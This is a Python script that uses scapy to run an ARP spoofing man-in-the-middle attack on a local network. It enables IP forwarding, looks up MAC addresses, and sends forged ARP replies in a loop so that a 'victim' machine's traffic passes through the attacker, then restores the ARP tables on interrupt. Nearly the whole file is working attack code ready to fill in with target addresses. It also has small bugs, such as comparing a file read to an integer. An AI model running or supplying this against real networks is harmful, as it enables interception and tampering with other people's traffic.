import scapy.all as scapy
import os
import time

def _enable_windows_iproute():
    """
    Enables IP route (IP Forwarding) in Windows
    """
    from services import WService
    # enable Remote Access service
    service = WService("RemoteAccess")
    service.start()

def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)

def enable_ip_route(verbose=True):
    """
    Enables IP forwarding
    """
    if verbose:
        print("[!] Enabling IP Routing...")
    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")

def get_mac(ip):
    #sends arp request to ip adress
    arp_request = scapy.ARP(pdst = ip)

    #creats ethernet frame that is send to all the devices on the network
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")

    #combines them into a single packet
    arp_request_broadcast = broadcast / arp_request 

    #makes a list with all the devices who answered to the ip adress
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    
    #returns the mac adress stored in answered lists
    return answered_list[0][1].hwsrc 

def spoof(spoof_ip, target_ip):
    target_mac = get_mac(target_ip)
    #creates a packet that contains an ARP reply with: op = 2 makes it an ARP reply 
    #psrc = ip that you want imporsonate (gateway)
    #pdst = where the reply is send (target)
    #hdwst = mac adress of the target you send the reply to
    false_arp_request = scapy.ARP(pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, op = 2)
    scapy.send(false_arp_request, verbose = 0)

def restore(spoof_ip, target_ip):
    spoof_mac = get_mac(spoof_ip)
    target_mac = get_mac(target_ip)
    restore_request = scapy.ARP(pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, hwsrc = spoof_mac, op = 2)
    scapy.send(restore_request, verbose = 0)

def arp_spoof():
    verbose = True
    #fill in the ip-adress of the victim
    target = ""
    #fill in the ip-adress of the host, probably your own!
    host = ""
    #enable ip-routing 
    enable_ip_route()
    if host != "" and target != "":
        try: 
            while True:
                spoof(target, host)
                spoof(host, target)
                time.sleep(2)

        except KeyboardInterrupt:
            restore(target, host)
            restore(host, target)
            print("ARP tables restored!")

